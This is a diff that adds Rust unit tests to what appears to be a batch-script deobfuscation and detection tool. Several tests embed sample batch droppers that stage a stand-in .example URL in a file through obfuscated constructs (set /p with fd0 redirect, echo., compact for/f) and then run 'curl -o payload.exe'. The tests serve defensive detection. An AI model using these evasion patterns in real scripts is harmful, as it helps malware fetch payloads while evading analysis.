@@ -582,6 +582,29 @@ curl -o payload.exe %U%"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn set_p_reads_first_line_from_fd0_prefix_redirected_file() {
+        let report = analyze(
+            br#"echo https://set-p-fd0-prefix-read.example/payload.exe>url.txt
+0^< url.txt set /p U=
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://set-p-fd0-prefix-read.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "set /p did not read fd0 prefix-redirected staged content: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -791,6 +814,39 @@ mod echo_tests {
         } else {
             panic!("not Content: {:?}", entry);
         }
+    }
+
+    #[test]
+    fn echo_dot_redirect_writes_payload_without_separator() {
+        let report = analyze(
+            br#"echo.https://echo-dot.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://echo-dot.example/payload.exe" && dst == "payload.exe"
+                )
+            }),
+            "echo. redirected payload did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn redirected_echo_dot_writes_blank_line_not_echo_state() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"echo.>out.txt"#, &mut env);
+        let entry = env.modified_filesystem.get("out.txt").expect("fs");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"\r\n"),
+            "echo. should write a blank line, got: {:?}",
+            entry
+        );
     }
 
     #[test]
@@ -2775,6 +2831,46 @@ echo %MARK%
                 .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
             "current-dir for /f file source should not stay unresolved: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn compact_for_f_reads_generated_file_source() {
+        let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
+for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://compact-for-f.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "compact for/f file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_allows_punctuation_loop_variable() {
+        let script = br#"echo https://for-f-punct-var.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%# in (url.txt) do curl -o payload.exe %%#"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-punct-var.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F punctuation loop variable did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
@@ -10704,6 +10800,20 @@ mod for_l_tests {
     }
 
     #[test]
+    fn compact_for_l_iterates_range() {
+        let script = b"for/l %%A in (1,1,3) do echo %%A\r\n";
+        let report = analyze(script, &Config::default());
+        for n in 1..=3 {
+            assert!(
+                report.deobfuscated.contains(&format!("echo {}", n)),
+                "missing echo {}: {}",
+                n,
+                report.deobfuscated
+            );
+        }
+    }
+
+    #[test]
     fn for_l_backward_range() {
         let script = b"for /L %%A in (3,-1,1) do echo %%A\r\n";
         let report = analyze(script, &Config::default());
@@ -13018,6 +13128,7 @@ mod tokenizer_misc_tests {
             Some("C:/Temp/original.js")
         );
         assert_eq!(command_name("set/p X=").as_deref(), Some("set"));
+        assert_eq!(command_name("0<url.txt set /p U=").as_deref(), Some("set"));
     }
 
     #[test]
